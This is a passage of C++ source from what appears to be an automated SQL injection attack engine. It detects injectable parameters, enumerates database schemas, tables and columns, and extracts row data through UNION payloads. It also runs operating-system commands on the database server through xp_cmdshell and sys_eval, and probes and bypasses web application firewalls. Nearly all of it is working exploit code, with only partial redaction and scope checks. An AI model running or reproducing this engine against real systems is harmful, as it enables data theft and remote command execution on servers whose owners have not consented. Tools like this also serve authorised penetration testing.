    auto payloads = offensive::payloads::sqli_payloads({"time"}, dbms, static_cast<size_t>(std::max(3, level * 3)));
    const uint64_t base = baseline.latency_ms == 0 ? 1 : baseline.latency_ms;
    for (const auto& p : payloads) {
        if (cancelled()) return out;
        const std::string injected = compose_payload_value(ip.original_value, p.value);
        auto resp = send_raw(target, build_injected(ip, injected), std::max(timeout_ms, 12000), "offensive_sqli.time");
        if (!resp.has_value()) continue;
        if (resp->latency_ms >= base + 4000 && resp->latency_ms >= 4500) {
            out.found = true;
            out.injection_type = "time";
            out.payload = injected;
            out.evidence = "time payload increased latency from baseline=" + std::to_string(base) + "ms to response=" + std::to_string(resp->latency_ms) + "ms";
            out.dbms = dbms_from_response(*resp);
            out.response = *resp;
            return out;
        }
        std::string waf_name;
        std::string waf_ev;
        if (blocked_by_waf(*resp, waf_name, waf_ev)) {
            out.waf_blocked = true;
            out.evidence = waf_ev;
        }
    }
    return out;
}

std::optional<insertion_point_t> find_session_point(const sqli_session_t& s)
{
    auto points = insertion_points::analyze(s.raw_request, s.url);
    for (const auto& ip : points) {
        if (ip.kind == s.insertion_kind && ip.name == s.parameter) return ip;
    }
    return std::nullopt;
}

request_target_t target_from_session(const sqli_session_t& s)
{
    request_target_t t;
    t.url = s.url;
    t.scheme = s.scheme;
    t.host = s.host;
    t.path = s.path;
    t.port = s.port;
    t.tls = s.tls;
    t.enforce_scope = s.enforce_scope;
    t.raw = s.raw_request;
    return t;
}

bool extract_between_markers(const exchange_observed_t& resp, const std::string& marker, std::string& value)
{
    std::string text = body_text(resp, 262144);
    const size_t a = text.find(marker);
    if (a == std::string::npos) return false;
    const size_t b = text.find(marker, a + marker.size());
    if (b == std::string::npos) return false;
    value = text.substr(a + marker.size(), b - (a + marker.size()));
    value = redact_sensitive_text(value, 4096);
    return true;
}

bool eval_scalar_query(const sqli_session_t& s,
                       const std::string& scalar_query,
                       int timeout_ms,
                       std::string& value,
                       json& evidence)
{
    if (s.union_columns <= 0 || s.union_marker_column <= 0 || s.union_mode.empty()) {
        evidence = {{"proof", "missing_union_marker_session"}, {"extraction_supported", false}};
        return false;
    }
    auto ip = find_session_point(s);
    if (!ip.has_value()) {
        evidence = {{"proof", "session_insertion_point_not_found"}, {"extraction_supported", false}};
        return false;
    }
    if (scalar_query.find(';') != std::string::npos || scalar_query.size() > 1500) {
        evidence = {{"proof", "query_rejected_by_bounded_heuristic"}, {"extraction_supported", false}};
        return false;
    }
    const std::string marker = make_id("AIDAQ");
    const std::string expression = concat_expr(s.dbms.empty() || s.dbms == "auto" ? "mysql" : s.dbms, marker, scalar_query);
    const std::string payload = union_payload(ip->original_value, s.union_mode, s.union_columns, s.union_marker_column, expression);
    auto resp = send_raw(target_from_session(s), build_injected(*ip, payload), timeout_ms, "offensive_sqli.extract");
    if (!resp.has_value()) {
        evidence = {{"proof", "no_response"}, {"transport_error", audit_http::last_error()}};
        return false;
    }
    evidence = response_summary(*resp);
    evidence["marker"] = marker;
    if (!extract_between_markers(*resp, marker, value)) {
        evidence["proof"] = "marker_not_observed";
        return false;
    }
    evidence["proof"] = "marker_observed";
    evidence["value_length"] = value.size();
    evidence["value_hash"] = hex64(fnv1a64(value));
    return true;
}

std::vector<std::string> dbms_candidates(const sqli_session_t& s, const json& params)
{
    const std::string requested = lower_ascii(json_string(params, "dbms"));
    if (!requested.empty() && requested != "auto") return {requested};
    const std::string known = lower_ascii(s.dbms);
    if (!known.empty() && known != "auto" && known != "unknown") return {known};
    return {"mysql", "postgres", "mssql", "sqlite", "oracle"};
}

std::string schemas_query(const std::string& dbms, int offset)
{
    if (dbms == "postgres") return "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name OFFSET " + std::to_string(offset) + " LIMIT 1";
    if (dbms == "mssql") return "SELECT name FROM (SELECT name,ROW_NUMBER() OVER (ORDER BY name) rn FROM sys.databases) a WHERE rn=" + std::to_string(offset + 1);
    if (dbms == "oracle") return "SELECT username FROM (SELECT username,ROWNUM rn FROM all_users) WHERE rn=" + std::to_string(offset + 1);
    if (dbms == "sqlite") return offset == 0 ? "SELECT 'main'" : "SELECT NULL";
    return "SELECT schema_name FROM information_schema.schemata ORDER BY schema_name LIMIT 1 OFFSET " + std::to_string(offset);
}

std::string current_db_query(const std::string& dbms)
{
    if (dbms == "postgres") return "SELECT current_database()";
    if (dbms == "mssql") return "SELECT DB_NAME()";
    if (dbms == "oracle") return "SELECT SYS_CONTEXT('USERENV','CURRENT_SCHEMA') FROM dual";
    if (dbms == "sqlite") return "SELECT 'main'";
    return "SELECT database()";
}

std::string current_user_query(const std::string& dbms)
{
    if (dbms == "postgres") return "SELECT current_user";
    if (dbms == "mssql") return "SELECT SYSTEM_USER";
    if (dbms == "oracle") return "SELECT USER FROM dual";
    if (dbms == "sqlite") return "SELECT ''";
    return "SELECT user()";
}

std::string tables_query(const std::string& dbms, const std::string& schema, int offset)
{
    if (dbms == "postgres") return "SELECT table_name FROM information_schema.tables WHERE table_schema=" + sql_literal(schema) + " ORDER BY table_name OFFSET " + std::to_string(offset) + " LIMIT 1";
    if (dbms == "mssql") return "SELECT name FROM (SELECT TABLE_NAME name,ROW_NUMBER() OVER (ORDER BY TABLE_NAME) rn FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_CATALOG=" + sql_literal(schema) + ") a WHERE rn=" + std::to_string(offset + 1);
    if (dbms == "oracle") return "SELECT table_name FROM (SELECT table_name,ROWNUM rn FROM all_tables WHERE owner=" + sql_literal(schema) + ") WHERE rn=" + std::to_string(offset + 1);
    if (dbms == "sqlite") return "SELECT name FROM sqlite_master WHERE type='table' ORDER BY name LIMIT 1 OFFSET " + std::to_string(offset);
    return "SELECT table_name FROM information_schema.tables WHERE table_schema=" + sql_literal(schema) + " ORDER BY table_name LIMIT 1 OFFSET " + std::to_string(offset);
}

std::string columns_query(const std::string& dbms, const std::string& schema, const std::string& table, int offset)
{
    if (dbms == "postgres") return "SELECT column_name||':'||data_type FROM information_schema.columns WHERE table_schema=" + sql_literal(schema) + " AND table_name=" + sql_literal(table) + " ORDER BY ordinal_position OFFSET " + std::to_string(offset) + " LIMIT 1";
    if (dbms == "mssql") return "SELECT name FROM (SELECT COLUMN_NAME name,ROW_NUMBER() OVER (ORDER BY ORDINAL_POSITION) rn FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME=" + sql_literal(table) + ") a WHERE rn=" + std::to_string(offset + 1);
    if (dbms == "oracle") return "SELECT column_name||':'||data_type FROM (SELECT column_name,data_type,ROWNUM rn FROM all_tab_columns WHERE table_name=" + sql_literal(upper_ascii(table)) + ") WHERE rn=" + std::to_string(offset + 1);
    if (dbms == "sqlite") return "SELECT name||':'||type FROM pragma_table_info(" + sql_literal(table) + ") LIMIT 1 OFFSET " + std::to_string(offset);
    return "SELECT CONCAT(column_name,':',column_type) FROM information_schema.columns WHERE table_name=" + sql_literal(table) + (schema.empty() ? "" : " AND table_schema=" + sql_literal(schema)) + " ORDER BY ordinal_position LIMIT 1 OFFSET " + std::to_string(offset);
}

std::string data_query(const std::string& dbms,
                       const std::string& schema,
                       const std::string& table,
                       const std::string& column,
                       int row_offset,
                       const std::string& where_clause)
{
    std::string qualified = table;
    if (!schema.empty() && dbms != "sqlite") qualified = schema + "." + table;
    std::string where = where_clause.empty() ? std::string() : " WHERE " + where_clause;
    if (dbms == "postgres" || dbms == "sqlite") return "SELECT CAST(" + column + " AS TEXT) FROM " + qualified + where + " LIMIT 1 OFFSET " + std::to_string(row_offset);
    if (dbms == "mssql") return "SELECT " + column + " FROM (SELECT CAST(" + column + " AS NVARCHAR(4000)) " + column + ",ROW_NUMBER() OVER (ORDER BY (SELECT NULL)) rn FROM " + qualified + where + ") a WHERE rn=" + std::to_string(row_offset + 1);
    if (dbms == "oracle") return "SELECT " + column + " FROM (SELECT " + column + ",ROWNUM rn FROM " + qualified + where + ") WHERE rn=" + std::to_string(row_offset + 1);
    return "SELECT CAST(" + column + " AS CHAR) FROM " + qualified + where + " LIMIT 1 OFFSET " + std::to_string(row_offset);
}

std::string version_query(const std::string& dbms)
{
    if (dbms == "postgres") return "SELECT version()";
    if (dbms == "mssql") return "SELECT @@version";
    if (dbms == "oracle") return "SELECT banner FROM v$version WHERE ROWNUM=1";
    if (dbms == "sqlite") return "SELECT sqlite_version()";
    return "SELECT @@version";
}

json action_result_base(sqli_session_t& s, const std::string& action)
{
    s.last_action = action;
    s.updated_ms = now_ms_wall();
    return session_public_status(s);
}

}

engine_result_t detect(const json& params)
{
    offensive::payloads::ensure_available();
    request_target_t target;
    std::string err;
    if (!build_request(params, target, err)) return error_result(err, "invalid_request");
    const int timeout_ms = json_int(params, "timeout_ms", 30000, 1000, 120000);
    const int level = json_int(params, "level", 1, 1, 5);
    const std::string requested_dbms = lower_ascii(json_string(params, "dbms", "auto"));
    const std::string param_target = json_string(params, "param_target");
    std::vector<std::string> techniques = json_string_array(params, "techniques", {"all"});
    std::set<std::string> technique_set;
    bool all_techniques = false;
    for (const auto& t : techniques) {
        const std::string l = lower_ascii(t);
        if (l == "all") all_techniques = true;
        technique_set.insert(l);
    }

    auto points = candidate_points(target, param_target);
    if (points.empty()) return error_result("no insertion points matched request", "no_insertion_points", {{"url", target.url}, {"param_target", param_target}});

    auto baseline = send_raw(target, target.raw, timeout_ms, "offensive_sqli.baseline");
    if (!baseline.has_value()) return error_result("baseline request failed", "transport_failed", {{"url", target.url}, {"transport_error", audit_http::last_error()}});

    sqli_session_t session;
    session.session_id = make_id("sqli");
    session.url = target.url;
    session.scheme = target.scheme;
    session.host = target.host;
    session.path = target.path;
    session.port = target.port;
    session.tls = target.tls;
    session.enforce_scope = target.enforce_scope;
    session.raw_request = target.raw;
    session.dbms = requested_dbms.empty() ? "auto" : requested_dbms;
    session.created_ms = now_ms_wall();
    session.updated_ms = session.created_ms;
    session.baseline_status = baseline->status_code;
    session.baseline_latency_ms = baseline->latency_ms;
    session.baseline_body = baseline->resp_body;
    session.baseline_headers = baseline->resp_headers;

    json issues_created = json::array();
    json tested = json::array();
    json findings = json::array();
    json waf_evidence = json::array();
    bool stopped_on_first = json_bool(params, "stop_on_first", true);

    for (const auto& ip : points) {
        if (cancelled()) break;
        json point_info;
        point_info["kind"] = ip.kind;
        point_info["name"] = ip.name;
        point_info["original_length"] = ip.original_value.size();
        point_info["original_hash"] = hex64(fnv1a64(ip.original_value));
        tested.push_back(point_info);

        std::vector<finding_t> point_findings;
        if (all_techniques || technique_set.count("error")) point_findings.push_back(run_error_checks(target, ip, timeout_ms, level, requested_dbms));
        if (all_techniques || technique_set.count("boolean")) point_findings.push_back(run_boolean_checks(target, ip, timeout_ms, level));
        if (all_techniques || technique_set.count("time")) point_findings.push_back(run_time_checks(target, ip, *baseline, timeout_ms, level, requested_dbms));
        if (all_techniques || technique_set.count("union")) point_findings.push_back(run_union_checks(target, ip, *baseline, timeout_ms, level));

        for (const auto& f : point_findings) {
            if (f.waf_blocked) {
                session.waf_detected = true;
                waf_evidence.push_back({{"parameter", ip.name}, {"evidence", f.evidence}});
            }
            if (!f.found) continue;
            session.vulnerable = true;
            session.parameter = ip.name;
            session.insertion_kind = ip.kind;
            session.original_value = ip.original_value;
            session.injection_type = f.injection_type;
            if (!f.dbms.empty() && f.dbms != "auto") session.dbms = f.dbms;
            session.dbms_version = f.dbms_version;
            session.union_columns = f.union_columns;
            session.union_marker_column = f.union_marker_column;
            session.union_mode = f.union_mode;
            const std::string type_key = "sqli." + f.injection_type;
            const std::string name = f.injection_type == "union" ? "SQL Injection (UNION-based)" :
                (f.injection_type == "boolean" ? "SQL Injection (boolean-based)" :
                (f.injection_type == "time" ? "SQL Injection (time-based blind)" : "SQL Injection (error-based)"));
            severity_t sev = f.injection_type == "error" ? severity_t::high : severity_t::high;
            confidence_t conf = f.injection_type == "time" ? confidence_t::firm : confidence_t::firm;
            uint64_t issue_id = add_issue(type_key, name, sev, conf, target, ip, f.response, "", f.evidence);
            session.issue_ids.push_back(issue_id);
            append_issue_id(issues_created, issue_id);
            json finding;
            finding["parameter"] = ip.name;
            finding["insertion_point"] = ip.kind;
            finding["injection_type"] = f.injection_type;
            finding["dbms"] = session.dbms;
            finding["payload_length"] = f.payload.size();
            finding["payload_hash"] = hex64(fnv1a64(f.payload));
            finding["evidence"] = f.evidence;
            finding["issue_id"] = std::to_string(issue_id);
            if (f.union_columns > 0) finding["union_columns"] = f.union_columns;
            findings.push_back(finding);
            if (stopped_on_first) break;
        }
        if (session.vulnerable && stopped_on_first) break;
    }

    session.status = cancelled() ? "cancelled" : "complete";
    json data = session_public_status(session);
    data["session_id"] = session.session_id;
    data["vulnerable"] = session.vulnerable;
    data["parameter"] = session.parameter;
    data["injection_type"] = session.injection_type;
    data["dbms"] = session.dbms;
    data["dbms_version"] = session.dbms_version;
    data["union_columns"] = session.union_columns;
    data["waf_detected"] = session.waf_detected;
    data["waf_evidence"] = waf_evidence;
    data["issues_created"] = issues_created;
    data["tested_insertion_points"] = tested;
    data["findings"] = findings;
    data["baseline"] = response_summary(*baseline);
    data["payload_inventory"] = offensive::payloads::inventory();
    data["proof_ready"] = session.vulnerable;
    data["proof_pending"] = false;
    data["status"] = session.status;
    session.results.push_back({{"action", "detect"}, {"result", data}});
    update_session(session);
    return ok_result(session.vulnerable ? "SQL injection evidence observed" : "SQL injection probes completed without confirmed evidence", data);
}

engine_result_t enumerate_schemas(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 60000, 1000, 180000);
    json data = action_result_base(session, "enumerate_schemas");
    json schemas = json::array();
    json evidence = json::array();
    std::string dbms_used;
    for (const auto& dbms : dbms_candidates(session, params)) {
        int misses = 0;
        for (int i = 0; i < 25 && misses < 3; ++i) {
            if (cancelled()) break;
            std::string value;
            json ev;
            if (eval_scalar_query(session, schemas_query(dbms, i), timeout_ms, value, ev) && !value.empty()) {
                schemas.push_back(value);
                dbms_used = dbms;
                misses = 0;
            } else {
                ++misses;
            }
            ev["dbms"] = dbms;
            ev["offset"] = i;
            evidence.push_back(ev);
        }
        if (!schemas.empty()) break;
    }
    std::string current_db;
    std::string current_user;
    json ev_db;
    json ev_user;
    const std::string dbms = dbms_used.empty() ? (session.dbms == "auto" ? std::string("mysql") : session.dbms) : dbms_used;
    (void)eval_scalar_query(session, current_db_query(dbms), timeout_ms, current_db, ev_db);
    (void)eval_scalar_query(session, current_user_query(dbms), timeout_ms, current_user, ev_user);
    data["dbms"] = dbms;
    data["schemas"] = schemas;
    data["current_db"] = current_db;
    data["current_user"] = sensitive_summary(current_user).find("[REDACTED") == 0 && sensitive_name("current_user") ? sensitive_summary(current_user) : redact_sensitive_text(current_user, 256);
    data["schema_count"] = schemas.size();
    data["evidence"] = evidence;
    data["current_db_evidence"] = ev_db;
    data["current_user_evidence"] = ev_user;
    data["proof_ready"] = !schemas.empty() || !current_db.empty();
    if (!data["proof_ready"].get<bool>()) data["status_reason"] = "no union extraction marker observed for schema queries";
    session.dbms = dbms;
    session.results.push_back({{"action", "enumerate_schemas"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi schema enumeration completed", data);
}

engine_result_t enumerate_tables(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 60000, 1000, 180000);
    const std::string schema = json_string(params, "schema");
    json data = action_result_base(session, "enumerate_tables");
    if (!schema.empty() && !safe_identifier(schema)) return error_result("schema contains unsupported characters", "invalid_schema", data);
    const std::string dbms = session.dbms == "auto" ? "mysql" : session.dbms;
    const std::string effective_schema = schema.empty() ? "" : schema;
    json tables = json::array();
    json evidence = json::array();
    int misses = 0;
    for (int i = 0; i < 50 && misses < 5; ++i) {
        if (cancelled()) break;
        std::string value;
        json ev;
        if (eval_scalar_query(session, tables_query(dbms, effective_schema, i), timeout_ms, value, ev) && !value.empty()) {
            tables.push_back({{"name", value}, {"row_count_estimate", nullptr}});
            misses = 0;
        } else {
            ++misses;
        }
        ev["offset"] = i;
        evidence.push_back(ev);
    }
    data["dbms"] = dbms;
    data["schema"] = effective_schema;
    data["tables"] = tables;
    data["table_count"] = tables.size();
    data["evidence"] = evidence;
    data["proof_ready"] = !tables.empty();
    if (!data["proof_ready"].get<bool>()) data["status_reason"] = "no union extraction marker observed for table queries";
    session.cached_tables[effective_schema] = tables;
    session.results.push_back({{"action", "enumerate_tables"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi table enumeration completed", data);
}

engine_result_t enumerate_columns(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 60000, 1000, 180000);
    const std::string schema = json_string(params, "schema");
    const std::string table = json_string(params, "table");
    json data = action_result_base(session, "enumerate_columns");
    if (table.empty()) return error_result("missing table", "missing_table", data);
    if (!schema.empty() && !safe_identifier(schema)) return error_result("schema contains unsupported characters", "invalid_schema", data);
    if (!safe_identifier(table)) return error_result("table contains unsupported characters", "invalid_table", data);
    const std::string dbms = session.dbms == "auto" ? "mysql" : session.dbms;
    json columns = json::array();
    json evidence = json::array();
    int misses = 0;
    for (int i = 0; i < 80 && misses < 6; ++i) {
        if (cancelled()) break;
        std::string value;
        json ev;
        if (eval_scalar_query(session, columns_query(dbms, schema, table, i), timeout_ms, value, ev) && !value.empty()) {
            const size_t colon = value.find(':');
            json col;
            col["name"] = colon == std::string::npos ? value : value.substr(0, colon);
            col["type"] = colon == std::string::npos ? "" : value.substr(colon + 1);
            col["nullable"] = nullptr;
            col["key"] = "";
            columns.push_back(col);
            misses = 0;
        } else {
            ++misses;
        }
        ev["offset"] = i;
        evidence.push_back(ev);
    }
    data["dbms"] = dbms;
    data["schema"] = schema;
    data["table"] = table;
    data["columns"] = columns;
    data["column_count"] = columns.size();
    data["evidence"] = evidence;
    data["proof_ready"] = !columns.empty();
    if (!data["proof_ready"].get<bool>()) data["status_reason"] = "no union extraction marker observed for column queries";
    session.cached_columns[(schema.empty() ? std::string() : schema + ".") + table] = columns;
    session.results.push_back({{"action", "enumerate_columns"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi column enumeration completed", data);
}

engine_result_t extract_data(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 120000, 1000, 300000);
    const int limit = json_int(params, "limit", 10, 1, 50);
    const int offset = json_int(params, "offset", 0, 0, 1000000);
    const std::string schema = json_string(params, "schema");
    const std::string table = json_string(params, "table");
    const std::string where_clause = json_string(params, "where_clause");
    json data = action_result_base(session, "extract_data");
    if (table.empty()) return error_result("missing table", "missing_table", data);
    if (!schema.empty() && !safe_identifier(schema)) return error_result("schema contains unsupported characters", "invalid_schema", data);
    if (!safe_identifier(table)) return error_result("table contains unsupported characters", "invalid_table", data);
    if (where_clause.find(';') != std::string::npos || where_clause.size() > 300) return error_result("where_clause rejected by bounded heuristic", "invalid_where_clause", data);
    std::vector<std::string> columns;
    if (params.contains("columns") && params["columns"].is_array()) {
        for (const auto& c : params["columns"]) {
            if (c.is_string()) columns.push_back(c.get<std::string>());
        }
    }
    if (columns.empty()) {
        auto it = session.cached_columns.find((schema.empty() ? std::string() : schema + ".") + table);
        if (it != session.cached_columns.end() && it->second.is_array()) {
            for (const auto& c : it->second) {
                if (c.contains("name") && c["name"].is_string()) columns.push_back(c["name"].get<std::string>());
            }
        }
    }
    columns.erase(std::remove_if(columns.begin(), columns.end(), [](const std::string& c) {
        return !safe_identifier(c);
    }), columns.end());
    if (columns.empty()) return error_result("columns are required unless enumerate_columns produced cached columns", "missing_columns", data);
    const std::string dbms = session.dbms == "auto" ? "mysql" : session.dbms;
    json rows = json::array();
    json evidence = json::array();
    for (int r = 0; r < limit; ++r) {
        if (cancelled()) break;
        json row;
        bool any_value = false;
        for (const auto& col : columns) {
            std::string value;
            json ev;
            if (eval_scalar_query(session, data_query(dbms, schema, table, col, offset + r, where_clause), timeout_ms, value, ev)) {
                any_value = true;
                if (sensitive_name(col)) {
                    row[col] = {{"redacted", true}, {"length", value.size()}, {"fnv64", hex64(fnv1a64(value))}};
                } else {
                    row[col] = redact_sensitive_text(value, 2048);
                }
            } else {
                row[col] = nullptr;
            }
            ev["row_offset"] = offset + r;
            ev["column"] = col;
            evidence.push_back(ev);
        }
        if (!any_value) break;
        rows.push_back(row);
    }
    data["dbms"] = dbms;
    data["schema"] = schema;
    data["table"] = table;
    data["columns_extracted"] = columns;
    data["row_count"] = rows.size();
    data["rows"] = rows;
    data["offset"] = offset;
    data["limit"] = limit;
    data["truncated"] = rows.size() == static_cast<size_t>(limit);
    data["evidence"] = evidence;
    data["proof_ready"] = !rows.empty();
    if (!data["proof_ready"].get<bool>()) data["status_reason"] = "no union extraction marker observed for data queries";
    session.results.push_back({{"action", "extract_data"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi data extraction completed", data);
}

engine_result_t os_command(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 60000, 1000, 180000);
    const std::string command = json_string(params, "command");
    json data = action_result_base(session, "os_command");
    if (command.empty()) return error_result("missing command", "missing_command", data);
    if (command.size() > 240 || command.find('\n') != std::string::npos || command.find('\r') != std::string::npos) return error_result("command rejected by bounded heuristic", "invalid_command", data);
    const std::string output_marker = make_id("AIDACMD");
    std::string value;
    json evidence;
    bool success = false;
    const std::string dbms = session.dbms == "auto" ? "mysql" : session.dbms;
    if (dbms == "mysql") {
        success = eval_scalar_query(session, "SELECT sys_eval(" + sql_literal("echo " + output_marker + " && " + command) + ")", timeout_ms, value, evidence);
    } else if (dbms == "mssql") {
        auto ip = find_session_point(session);
        if (ip.has_value()) {
            const std::string payload = ip->original_value + "'; EXEC master..xp_cmdshell " + sql_literal("echo " + output_marker + " && " + command) + "--";
            auto resp = send_raw(target_from_session(session), build_injected(*ip, payload), timeout_ms, "offensive_sqli.os_command");
            if (resp.has_value()) {
                evidence = response_summary(*resp);
                if (body_contains(*resp, output_marker)) {
                    success = true;
                    value = snippet_around(*resp, output_marker, 512);
                }
            } else {
                evidence = {{"proof", "no_response"}, {"transport_error", audit_http::last_error()}};
            }
        }
    } else {
        evidence = {{"proof", "no_output_capable_technique_for_dbms"}, {"dbms", dbms}};
    }
    data["dbms"] = dbms;
    data["technique"] = dbms == "mssql" ? "xp_cmdshell" : (dbms == "mysql" ? "sys_eval" : "none");
    data["command_length"] = command.size();
    data["command_hash"] = hex64(fnv1a64(command));
    data["success"] = success && value.find(output_marker) != std::string::npos;
    data["output"] = data["success"].get<bool>() ? redact_sensitive_text(value, 2048) : "";
    data["evidence"] = evidence;
    data["proof_ready"] = data["success"];
    if (!data["proof_ready"].get<bool>()) data["status_reason"] = "no command output marker observed";
    session.results.push_back({{"action", "os_command"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi OS command attempt completed", data);
}

engine_result_t waf_identify(const json& params)
{
    request_target_t target;
    std::string err;
    if (!build_request(params, target, err)) return error_result(err, "invalid_request");
    const int timeout_ms = json_int(params, "timeout_ms", 15000, 1000, 60000);
    auto points = candidate_points(target, json_string(params, "param_target"));
    if (points.empty()) return error_result("no insertion points matched request", "no_insertion_points");
    json blocked_codes = json::array();
    json blocked_patterns = json::array();
    json probes = json::array();
    bool detected = false;
    std::string waf_name;
    std::string waf_evidence;
    std::vector<std::string> test_payloads = {"' OR 1=1--", " UNION SELECT NULL--", "<script>alert(1)</script>"};
    for (const auto& payload : test_payloads) {
        if (cancelled()) break;
        auto resp = send_raw(target, build_injected(points.front(), compose_payload_value(points.front().original_value, payload)), timeout_ms, "offensive_sqli.waf_identify");
        if (!resp.has_value()) continue;
        std::string name;
        std::string evidence;
        bool blocked = blocked_by_waf(*resp, name, evidence);
        probes.push_back({{"payload_hash", hex64(fnv1a64(payload))}, {"status_code", resp->status_code}, {"blocked", blocked}, {"response", response_summary(*resp)}});
        if (blocked) {
            detected = true;
            waf_name = name;
            waf_evidence = evidence;
            blocked_codes.push_back(resp->status_code);
            blocked_patterns.push_back(payload.find("script") != std::string::npos ? "xss_probe" : "sqli_probe");
        }
    }
    json data;
    data["waf_detected"] = detected;
    data["waf_name"] = detected ? waf_name : "";
    data["waf_confidence"] = detected ? "firm" : "tentative";
    data["evidence"] = waf_evidence;
    data["blocked_status_codes"] = blocked_codes;
    data["blocked_patterns"] = blocked_patterns;
    data["probes"] = probes;
    data["proof_ready"] = detected;
    return ok_result("WAF identification probes completed", data);
}

engine_result_t waf_bypass(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 60000, 1000, 180000);
    auto ip = find_session_point(session);
    json data = action_result_base(session, "waf_bypass");
    if (!ip.has_value()) return error_result("session insertion point not found", "session_point_missing", data);
    auto payloads = offensive::payloads::sqli_payloads({"waf_bypass"}, session.dbms, 32);
    json attempts = json::array();
    json issues = json::array();
    bool confirmed = false;
    for (const auto& p : payloads) {
        if (cancelled()) break;
        const std::string injected = compose_payload_value(ip->original_value, p.value);
        auto resp = send_raw(target_from_session(session), build_injected(*ip, injected), timeout_ms, "offensive_sqli.waf_bypass");
        if (!resp.has_value()) continue;
        std::string waf_name;
        std::string waf_ev;
        const bool blocked = blocked_by_waf(*resp, waf_name, waf_ev);
        std::string matched;
        std::string dbms;
        const bool sql_error = sql_error_match(*resp, matched, dbms);
        json attempt = response_summary(*resp);
        attempt["payload_hash"] = hex64(fnv1a64(injected));
        attempt["technique"] = p.technique;
        attempt["blocked"] = blocked;
        attempt["sql_error"] = sql_error;
        attempts.push_back(attempt);
        if (!blocked && sql_error) {
            confirmed = true;
            uint64_t issue_id = add_issue("sqli.waf-bypass", "SQL Injection WAF bypass", severity_t::high, confidence_t::firm, target_from_session(session), *ip, *resp, "", "WAF bypass payload reached SQL error evidence: " + matched);
            session.issue_ids.push_back(issue_id);
            append_issue_id(issues, issue_id);
            break;
        }
    }
    data["confirmed_bypass"] = confirmed;
    data["attempts"] = attempts;
    data["issues_created"] = issues;
    data["proof_ready"] = confirmed;
    if (!confirmed) data["status_reason"] = "no WAF bypass payload produced unblocked SQL evidence";
    session.results.push_back({{"action", "waf_bypass"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi WAF bypass probes completed", data);
}

engine_result_t fingerprint_db(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    const int timeout_ms = json_int(params, "timeout_ms", 60000, 1000, 180000);
    json data = action_result_base(session, "fingerprint_db");
    json attempts = json::array();
    bool found = false;
    for (const auto& dbms : dbms_candidates(session, params)) {
        std::string value;
        json ev;
        bool ok = eval_scalar_query(session, version_query(dbms), timeout_ms, value, ev);
        ev["dbms_candidate"] = dbms;
        attempts.push_back(ev);
        if (ok && !value.empty()) {
            session.dbms = dbms;
            session.dbms_version = redact_sensitive_text(value, 512);
            found = true;
            break;
        }
    }
    data["dbms"] = session.dbms;
    data["dbms_version"] = session.dbms_version;
    data["attempts"] = attempts;
    data["proof_ready"] = found;
    if (!found) data["status_reason"] = "no DBMS version marker observed";
    session.results.push_back({{"action", "fingerprint_db"}, {"result", data}});
    update_session(session);
    return ok_result("SQLi DBMS fingerprinting completed", data);
}

engine_result_t get_status(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    return ok_result("SQLi session status", session_public_status(session));
}

engine_result_t get_results(const json& params)
{
    sqli_session_t session;
    engine_result_t err;
    if (!load_session(params, session, err)) return err;
    json data = session_public_status(session);
    data["results"] = session.results;
    data["result_count"] = session.results.size();
    data["format"] = json_string(params, "format", "json");
    return ok_result("SQLi session results", data);
}

}
}
}
}
